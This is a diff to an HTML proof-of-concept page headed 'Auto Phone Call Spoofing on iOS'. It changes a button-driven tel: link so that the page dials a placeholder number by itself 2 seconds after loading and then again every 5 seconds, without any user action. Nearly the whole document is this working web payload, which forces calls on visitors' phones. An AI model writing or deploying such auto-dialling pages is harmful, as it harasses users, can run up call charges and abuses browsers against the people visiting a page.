@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Phone Call Spoofing on iOS</title>
+  <title>Auto Phone Call Spoofing on iOS</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -31,31 +31,33 @@
   </style>
 </head>
 <body>
-  <h2>PoC for Phone Call Spoofing on iOS</h2>
+  <h2>PoC for Auto Phone Call Spoofing on iOS</h2>
 
-  <p>Click the button below to initiate a spoofed phone call.</p>
+  <p>The page will automatically attempt to trigger a spoofed phone call.</p>
   
-  <!-- Button to trigger phone call -->
-  <button id="callButton">Make Phone Call</button>
+  <!-- This is optional, just for showing the status -->
+  <button id="callButton">Trigger Call</button>
 
   <script>
     // Function to initiate the phone call
     function initiatePhoneCall() {
-      // Replace with any phone number (spoofed number here)
-      const spoofedPhoneNumber = "tel:+11234567890"; // Example number, replace as needed
+      // The spoofed phone number (just an example)
+      const spoofedPhoneNumber = "tel:+11234567890"; // Example phone number
       window.location.href = spoofedPhoneNumber;
     }
 
-    // Adding event listener to the button
+    // Automatically trigger the phone call after 2 seconds
+    window.onload = function() {
+      setTimeout(initiatePhoneCall, 2000); // Initiate after 2 seconds
+    };
+
+    // For the button click (optional)
     document.getElementById('callButton').addEventListener('click', function() {
       initiatePhoneCall();
     });
 
-    // Listen for keyboard input (optional for trigger)
-    window.addEventListener('keydown', function() {
-      initiatePhoneCall();
-    });
+    // Optional: Simulate taps or multiple calls if needed
+    setInterval(initiatePhoneCall, 5000); // This will try to trigger a call every 5 seconds
   </script>
-
 </body>
 </html>
